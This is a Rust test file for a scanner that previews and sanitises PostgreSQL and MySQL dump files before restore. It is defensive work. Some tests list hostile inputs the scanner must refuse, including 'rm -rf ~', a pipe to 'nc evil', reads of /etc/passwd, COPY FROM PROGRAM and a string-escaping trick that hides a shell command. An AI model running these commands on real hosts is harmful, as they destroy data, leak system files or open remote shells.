//! Tests for the plain-SQL scanner: the real dumps in tests/fixtures/dumps (made by make.sh), and hostile files.

use super::*;

fn fixture(name: &str) -> Vec<u8> {
    let p = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../tests/fixtures/dumps")
        .join(name);
    std::fs::read(&p).unwrap_or_else(|e| panic!("{}: {e}", p.display()))
}

fn preview(d: Dialect, text: &[u8]) -> Result<PlainInfo, Refusal> {
    scan_all(d, text, None, true).map(|(i, _)| i)
}

fn rw() -> Rewrite {
    Rewrite {
        section: None,
        skip_owner_acl: true,
        include_roles: false,
        existing: Existing::Stop,
        content: Content::All,
        strip_definer: true,
        keep_sandbox_line: true,
        tables: None,
    }
}

fn send(d: Dialect, text: &[u8], r: Rewrite) -> String {
    String::from_utf8(scan_all(d, text, Some(r), true).unwrap().1).unwrap()
}

/// Feeding in tiny chunks gives the same answer as feeding all at once (no token is split by a chunk edge).
fn send_chunked(d: Dialect, text: &[u8], r: Rewrite, size: usize) -> String {
    let mut s = Scanner::new(d, Some(r), true);
    let mut out = Vec::new();
    for c in text.chunks(size) {
        s.feed(c, &mut out).unwrap();
    }
    s.finish(&mut out).unwrap();
    String::from_utf8(out).unwrap()
}

#[test]
fn real_pg_dumps_preview_objects_rows_owners_and_versions() {
    for v in ["13", "16", "17"] {
        let info = preview(Dialect::Pg, &fixture(&format!("pg{v}.sql"))).unwrap();
        let names: Vec<String> = info
            .objects
            .iter()
            .map(|o| format!("{} {}", o.kind, o.name))
            .collect();
        for want in [
            "table public.customers",
            "table public.orders",
            "view public.big_orders",
            "function public.order_count",
            "type public.mood",
            "trigger orders_touch",
        ] {
            assert!(
                names.iter().any(|n| n == want),
                "pg{v}: {want} not in {names:?}"
            );
        }
        assert_eq!(info.rows.get("public.customers"), Some(&(3, true)), "pg{v}");
        assert_eq!(info.rows.get("public.orders"), Some(&(4, true)), "pg{v}");
        assert!(
            info.owners.contains(&"app_owner".to_string()),
            "pg{v}: {:?}",
            info.owners
        );
        assert!(info.grants >= 1);
        assert_eq!(
            info.made_by
                .as_deref()
                .map(|m| m.starts_with(&format!("pg_dump {v}"))),
            Some(true),
            "pg{v}: {:?}",
            info.made_by
        );
        assert!(info.server_version.as_deref().unwrap_or("").contains(v));
        // --inserts: rows are counted from the tuples.
        let ins = preview(Dialect::Pg, &fixture(&format!("pg{v}-inserts.sql"))).unwrap();
        assert_eq!(ins.rows.get("public.orders"), Some(&(4, false)), "pg{v}");
    }
}

#[test]
fn real_mysql_and_mariadb_dumps_preview() {
    for f in ["mysql84.sql", "mariadb11.sql", "mysql84-databases.sql"] {
        let info = preview(Dialect::My, &fixture(f)).unwrap();
        let names: Vec<String> = info
            .objects
            .iter()
            .map(|o| format!("{} {}", o.kind, o.name))
            .collect();
        assert!(
            names.contains(&"table customers".to_string()),
            "{f}: {names:?}"
        );
        assert!(
            names.contains(&"table orders".to_string()),
            "{f}: {names:?}"
        );
        assert_eq!(info.rows.get("orders"), Some(&(4, false)), "{f}");
        assert_eq!(info.source_db.as_deref(), Some("shop"), "{f}");
        if f != "mysql84-databases.sql" {
            assert!(
                names.iter().any(|n| n == "trigger orders_touch"),
                "{f}: {names:?}"
            );
            assert!(info.definers >= 2, "{f}: {}", info.definers);
        }
    }
    assert!(
        preview(Dialect::My, &fixture("mariadb11.sql"))
            .unwrap()
            .mariadb_sandbox
    );
    assert_eq!(
        preview(Dialect::My, &fixture("mysql84-databases.sql"))
            .unwrap()
            .databases,
        vec!["shop".to_string()]
    );
}

#[test]
fn pg_dumpall_has_sections_roles_and_superusers() {
    let info = preview(Dialect::Pg, &fixture("pg16-all.sql")).unwrap();
    assert!(info.cluster);
    assert!(
        info.databases.contains(&"shop".to_string()),
        "{:?}",
        info.databases
    );
    assert!(
        info.roles >= 2 && info.superuser_roles >= 1,
        "{} {}",
        info.roles,
        info.superuser_roles
    );
    // Restoring the `shop` section only: no roles, no other database, no CREATE DATABASE or \connect.
    let out = send(
        Dialect::Pg,
        &fixture("pg16-all.sql"),
        Rewrite {
            section: Some("shop".into()),
            ..rw()
        },
    );
    assert!(out.contains("CREATE TABLE public.customers"));
    assert!(
        !out.contains("CREATE ROLE") && !out.contains("SUPERUSER"),
        "{out}"
    );
    assert!(
        !out.contains("CREATE DATABASE") && !out.contains("\\connect"),
        "{out}"
    );
    // With roles asked for, ordinary role statements go; a superuser never does.
    let out = send(
        Dialect::Pg,
        &fixture("pg16-all.sql"),
        Rewrite {
            section: Some("shop".into()),
            include_roles: true,
            ..rw()
        },
    );
    assert!(out.contains("CREATE ROLE app_owner"), "{out}");
    assert!(!out.contains(" SUPERUSER"), "{out}");
}

#[test]
fn the_sent_stream_drops_owners_grants_and_restrict_and_keeps_copy_data_whole() {
    for v in ["13", "16", "17"] {
        let src = fixture(&format!("pg{v}.sql"));
        let out = send(Dialect::Pg, &src, rw());
        assert!(
            !out.contains("OWNER TO") && !out.contains("GRANT "),
            "pg{v}"
        );
        assert!(!out.contains("\\restrict"), "pg{v}");
        // COPY data lines pass byte for byte, with their end marker.
        let copy_at = out.find("COPY public.orders").unwrap();
        let block: String = out[copy_at..]
            .lines()
            .take(6)
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            block.contains("tab\\\\there")
                && block.contains("line\\nbreak")
                && block.contains("\\."),
            "pg{v}: {block}"
        );
        // Chunk edges change nothing.
        for size in [1, 7, 64, 200, 4096] {
            assert_eq!(
                send_chunked(Dialect::Pg, &src, rw(), size),
                out,
                "pg{v} chunk {size}"
            );
        }
        // Keeping owners keeps the file nearly as it was.
        let kept = send(
            Dialect::Pg,
            &src,
            Rewrite {
                skip_owner_acl: false,
                ..rw()
            },
        );
        assert!(kept.contains("OWNER TO app_owner") && kept.contains("GRANT SELECT"));
    }
}

#[test]
fn schema_only_and_data_only_split_the_dump() {
    let src = fixture("pg16.sql");
    let schema = send(
        Dialect::Pg,
        &src,
        Rewrite {
            content: Content::Schema,
            ..rw()
        },
    );
    assert!(
        schema.contains("CREATE TABLE")
            && !schema.contains("COPY public.orders")
            && !schema.contains("tab\\\\there")
    );
    let data = send(
        Dialect::Pg,
        &src,
        Rewrite {
            content: Content::Data,
            ..rw()
        },
    );
    assert!(
        !data.contains("CREATE TABLE")
            && data.contains("COPY public.orders")
            && data.contains("tab\\\\there"),
        "{data}"
    );
    assert!(
        data.contains("setval"),
        "data only into new tables keeps the sequences"
    );
    let append = send(
        Dialect::Pg,
        &src,
        Rewrite {
            existing: Existing::Append,
            ..rw()
        },
    );
    assert!(
        !append.contains("CREATE TABLE")
            && !append.contains("setval")
            && append.contains("COPY public.orders")
    );
    let my = send(
        Dialect::My,
        &fixture("mysql84.sql"),
        Rewrite {
            content: Content::Data,
            ..rw()
        },
    );
    assert!(
        !my.contains("CREATE TABLE") && my.contains("INSERT INTO `orders`"),
        "{my}"
    );
}

#[test]
fn replace_puts_a_drop_before_each_relation_and_or_replace_on_functions() {
    let out = send(
        Dialect::Pg,
        &fixture("pg16.sql"),
        Rewrite {
            existing: Existing::Replace,
            ..rw()
        },
    );
    let drop = out
        .find("DROP TABLE IF EXISTS public.customers CASCADE;")
        .expect(&out);
    assert!(drop < out.find("CREATE TABLE public.customers").unwrap());
    assert!(out.contains("DROP TYPE IF EXISTS public.mood CASCADE;"));
    assert!(out.contains("DROP VIEW IF EXISTS public.big_orders CASCADE;"));
    assert!(
        out.contains("CREATE OR REPLACE FUNCTION public.order_count"),
        "{out}"
    );
    let my = send(
        Dialect::My,
        &fixture("mysql84.sql"),
        Rewrite {
            existing: Existing::Replace,
            ..rw()
        },
    );
    assert!(
        my.contains("DROP TRIGGER IF EXISTS `orders_touch`;;"),
        "a drop under DELIMITER ;; ends with ;;: {my}"
    );
}

#[test]
fn mysql_definers_are_removed_and_the_sandbox_line_follows_the_client() {
    let src = fixture("mariadb11.sql");
    let out = send(Dialect::My, &src, rw());
    assert!(out.starts_with("/*M!999999\\- enable the sandbox mode */"));
    assert!(!out.contains("DEFINER=`root`"), "{out}");
    assert!(
        out.contains("SQL SECURITY DEFINER")
            || !src.windows(20).any(|w| w == b"SQL SECURITY DEFINER")
    );
    assert!(out.contains("INSERT INTO `orders`") && out.contains("'quote\\'s'"));
    let oracle = send(
        Dialect::My,
        &src,
        Rewrite {
            keep_sandbox_line: false,
            ..rw()
        },
    );
    assert!(!oracle.contains("sandbox"));
    for size in [1, 5, 33, 300] {
        assert_eq!(
            send_chunked(Dialect::My, &src, rw(), size),
            out,
            "chunk {size}"
        );
    }
    assert_eq!(
        strip_definer(b"CREATE DEFINER=`a``b`@`%` PROCEDURE p()"),
        b"CREATE  PROCEDURE p()".to_vec()
    );
    assert_eq!(
        strip_definer(b"/*!50017 DEFINER=root@localhost*/ x 'DEFINER=y@z'"),
        b"/*!50017 */ x 'DEFINER=y@z'".to_vec()
    );
    assert_eq!(
        strip_definer(b"DEFINER = CURRENT_USER() VIEW"),
        b" VIEW".to_vec()
    );
}

#[test]
fn use_and_connect_pick_the_section_and_never_reach_the_tool() {
    let out = send(Dialect::My, &fixture("mysql84-databases.sql"), rw());
    assert!(
        !out.contains("USE `shop`") && !out.contains("CREATE DATABASE"),
        "{out}"
    );
    assert!(out.contains("CREATE TABLE `customers`"));
    let two = b"CREATE DATABASE a;\nUSE a;\nCREATE TABLE t1 (x int);\nCREATE DATABASE b;\nUSE `b`;\nCREATE TABLE t2 (x int);\n";
    let info = preview(Dialect::My, two).unwrap();
    assert_eq!(info.databases, vec!["a".to_string(), "b".to_string()]);
    assert_eq!(
        info.objects
            .iter()
            .map(|o| o.database.clone().unwrap_or_default())
            .collect::<Vec<_>>(),
        vec!["a", "b"]
    );
    let only_b = send(
        Dialect::My,
        two,
        Rewrite {
            section: Some("b".into()),
            ..rw()
        },
    );
    assert!(only_b.contains("t2") && !only_b.contains("t1"), "{only_b}");
}

/// Every refused client command, in both clients; the line is named.
#[test]
fn client_commands_that_reach_the_host_refuse_the_file_naming_the_line() {
    let pg = [
        ("\\! rm -rf ~\n", "runs a program on the host"),
        ("\\o |nc evil 1\n", "write a file or run a program"),
        ("SELECT 1 \\g |sh\n", "inside a statement"),
        ("\\copy t from program 'id'\n", "\\copy"),
        ("\\i /etc/passwd\n", "reads a file on the host"),
        ("\\setenv PAGER sh\n", "runs a program"),
        ("\\set ON_ERROR_STOP 0 \\\\ \\! id\n", "two client commands"),
        ("\\.\n", "\\."),
        ("\\gexec\n", "runs a program"),
    ];
    for (cmd, want) in pg {
        let text = format!("SET x = 1;\n-- fine\nCREATE TABLE t (a int);\n{cmd}");
        let e = preview(Dialect::Pg, text.as_bytes()).unwrap_err();
        assert_eq!(e.line, 4, "{cmd}");
        assert!(e.message().contains(want), "{cmd}: {}", e.message());
        assert!(e.message().starts_with("Line 4 "), "{}", e.message());
    }
    let my = [
        ("system id\n", "runs a program on the host"),
        ("\\! id\n", "runs a program"),
        ("source /etc/passwd\n", "reads a file"),
        ("tee /tmp/x\n", "writes a file"),
        ("pager sh\n", "runs a program"),
        ("SELECT 1; \\! id\n", "runs a program"),
        ("connect other\n", "connects somewhere else"),
        ("/*M!999999\\- enable the sandbox mode */ \\! id\n", "\\-"),
    ];
    for (cmd, want) in my {
        let text = format!("SET NAMES utf8;\nCREATE TABLE t (a int);\n\n{cmd}");
        let e = preview(Dialect::My, text.as_bytes()).unwrap_err();
        assert_eq!(e.line, 4, "{cmd}");
        assert!(e.message().contains(want), "{cmd}: {}", e.message());
    }
}

/// The same characters where the client doesn't read them as commands are harmless and pass.
#[test]
fn commands_hidden_in_comments_strings_dollar_quotes_and_copy_data_are_harmless() {
    let pg = "-- \\! not run\n/* \\! nor /* nested \\o |x */ this */\nSELECT '\\! a string', E'it\\'s \\! fine', $f$ \\! body $f$, $$ \\o $$;\n\
              CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $body$ SELECT 1 $body$;\n\
              COPY t (a) FROM stdin;\n\\! data line\n\\o |x\n\\.\nSELECT 2;\n";
    let info = preview(Dialect::Pg, pg.as_bytes()).unwrap();
    assert_eq!(info.rows.get("t"), Some(&(2, true)));
    let my = "# \\! comment\n-- \\! comment\n/* \\! comment */\nINSERT INTO t VALUES ('\\\\! a', 'it\\'s', \"\\\\! b\"), (2, 'x', 'y');\nSELECT `odd\\name` FROM t;\n";
    let info = preview(Dialect::My, my.as_bytes()).unwrap();
    assert_eq!(info.rows.get("t"), Some(&(2, false)));
}

#[test]
fn statements_that_reach_outside_the_database_refuse_the_file() {
    let pg = [
        "COPY t FROM PROGRAM 'id';",
        "COPY t TO '/tmp/x';",
        "COPY t (a, b) FROM '/etc/passwd';",
        "SELECT pg_read_file('/etc/passwd');",
        "SELECT \"lo_import\"('/etc/passwd');",
        "ALTER SYSTEM SET archive_command = 'id';",
        "CREATE LANGUAGE plpython3u;",
        "CREATE OR REPLACE TRUSTED PROCEDURAL LANGUAGE plperlu;",
        "DO LANGUAGE plpython3u $$ import os $$;",
        "DO $$ import os $$ LANGUAGE plperlu;",
        "SELECT set_config('standard_conforming_strings', 'off', false);",
    ];
    for s in pg {
        let e = preview(Dialect::Pg, format!("SELECT 1;\n{s}\n").as_bytes()).expect_err(s);
        assert_eq!(e.line, 2, "{s}: {e:?}");
    }
    let my = [
        "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t;",
        "SELECT * FROM t INTO OUTFILE '/tmp/x';",
        "SELECT load_file('/etc/passwd');",
        "INSTALL PLUGIN x SONAME 'x.so';",
        "CREATE FUNCTION f RETURNS STRING SONAME 'udf.so';",
        "/*!40101 SET SQL_MODE='NO_BACKSLASH_ESCAPES' */;",
    ];
    for s in my {
        let e = preview(Dialect::My, format!("SELECT 1;\n{s}\n").as_bytes()).expect_err(s);
        assert_eq!(e.line, 2, "{s}: {e:?}");
    }
    // What a dump legitimately has passes.
    preview(Dialect::Pg, b"COPY t (a) FROM stdin;\n1\n\\.\nCOPY (SELECT 1) TO stdout;\nCREATE OR REPLACE PROCEDURAL LANGUAGE plpgsql;\nDO $$ BEGIN END $$;\nDO LANGUAGE plpgsql $$ BEGIN END $$;\nCREATE FUNCTION f() RETURNS void LANGUAGE plpython3u AS $$ pass $$;\n").unwrap();
}

/// psql reads strings differently while standard_conforming_strings is off: the scanner follows it, so a command
/// psql would see can't hide in what looks like a string.
#[test]
fn standard_conforming_strings_off_is_followed() {
    let sneaky = "SET standard_conforming_strings = off;\nSELECT 'a\\' ' \\! id';\n";
    assert!(preview(Dialect::Pg, sneaky.as_bytes()).is_err());
    // The same text with the setting on is one harmless string followed by a broken statement psql rejects.
    let on = "SELECT 'a\\' ' \\! id';\n";
    let e = preview(Dialect::Pg, on.as_bytes());
    assert!(e.is_ok(), "{e:?}");
    // Back on after RESET ALL (server default on).
    assert!(preview(
        Dialect::Pg,
        b"SET standard_conforming_strings TO 'off';\nRESET ALL;\nSELECT 'a\\' ' \\! id';\n"
    )
    .is_ok());
    // A server whose default is off: the scanner starts there.
    let mut s = Scanner::new(Dialect::Pg, None, false);
    let mut out = Vec::new();
    s.feed(on.as_bytes(), &mut out).unwrap();
    assert!(s.finish(&mut out).is_err());
}

#[test]
fn truncated_and_garbage_input_never_panics() {
    let mut seed: u64 = 0x2545_f491_4f6c_dd1d;
    let corpus = [
        fixture("pg16.sql"),
        fixture("mysql84.sql"),
        fixture("mariadb11.sql"),
    ];
    for round in 0..300 {
        let base = &corpus[round % corpus.len()];
        let mut bytes = base[..(seed as usize % base.len())].to_vec();
        for _ in 0..(round % 20) {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            if !bytes.is_empty() {
                let at = seed as usize % bytes.len();
                bytes[at] = (seed >> 32) as u8;
            }
        }
        for d in [Dialect::Pg, Dialect::My] {
            let _ = scan_all(d, &bytes, Some(rw()), true);
        }
    }
}

#[test]
fn line_numbers_are_grouped() {
    assert_eq!(group(18204), "18,204");
    assert_eq!(group(7), "7");
    assert_eq!(group(1_000_000), "1,000,000");
}

#[test]
fn choosing_tables_leaves_out_everything_that_belongs_to_the_others() {
    let keep = Some(vec!["public.customers".to_string()]);
    let out = send(
        Dialect::Pg,
        &fixture("pg16.sql"),
        Rewrite {
            tables: keep,
            ..rw()
        },
    );
    assert!(
        out.contains("CREATE TABLE public.customers") && out.contains("COPY public.customers"),
        "{out}"
    );
    assert!(
        !out.contains("CREATE TABLE public.orders")
            && !out.contains("COPY public.orders")
            && !out.contains("tab\\\\there"),
        "{out}"
    );
    assert!(
        !out.contains("ALTER TABLE ONLY public.orders") && !out.contains("orders_touch"),
        "{out}"
    );
    // Objects that belong to no table stay.
    assert!(
        out.contains("CREATE TYPE public.mood")
            && out.contains("CREATE FUNCTION public.order_count")
    );
    let my = send(
        Dialect::My,
        &fixture("mysql84.sql"),
        Rewrite {
            tables: Some(vec!["orders".into()]),
            ..rw()
        },
    );
    assert!(
        my.contains("INSERT INTO `orders`")
            && !my.contains("INSERT INTO `customers`")
            && !my.contains("CREATE TABLE `customers`"),
        "{my}"
    );
}
